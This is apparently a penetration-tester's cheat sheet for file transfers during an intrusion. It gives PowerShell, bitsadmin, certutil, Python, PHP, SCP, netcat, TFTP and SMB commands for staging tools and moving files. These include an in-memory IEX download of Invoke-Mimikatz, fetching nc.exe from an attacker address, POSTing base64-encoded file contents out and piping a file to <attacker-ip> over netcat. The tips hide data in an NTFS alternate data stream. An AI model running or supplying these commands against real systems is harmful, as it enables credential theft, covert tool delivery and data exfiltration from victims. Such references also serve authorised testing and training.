# File Transfers

## PowerShell

```powershell
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile nc.exe
$bytes = [System.IO.File]::ReadAllBytes("C:\Temp\file.txt")
$b64 = [System.Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri http://10.10.10.32/upload -Method POST -Body $b64
```

## Windows Native Tools

```powershell
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

## Linux Tools

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Python

```python
import requests
response = requests.get('http://10.10.10.32/nc.exe')
with open('nc.exe', 'wb') as file:
    file.write(response.content)
```

## Other Methods

### PHP

```bash
php -r '$f=file_get_contents("https://<snip>/LinEnum.sh");file_put_contents("LinEnum.sh",$f);'
```

### SCP

```bash
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

### Netcat

```bash
nc -lvp 4444 > received_file
nc <attacker-ip> 4444 < file_to_send
```

### FTP

```bash
ftp 10.10.10.32
```

### TFTP

```bash
tftp -i 10.10.10.32 GET nc.exe
tftp -i 10.10.10.32 PUT nc.exe
```

### SMB

```bash
smbclient \\10.10.10.32\share -U username
put file.txt
get file.txt
```

## Tips

```powershell
type nc.exe > file.txt:stream
```

```bash
7z a -psecret -mhe protected.7z file.txt
```
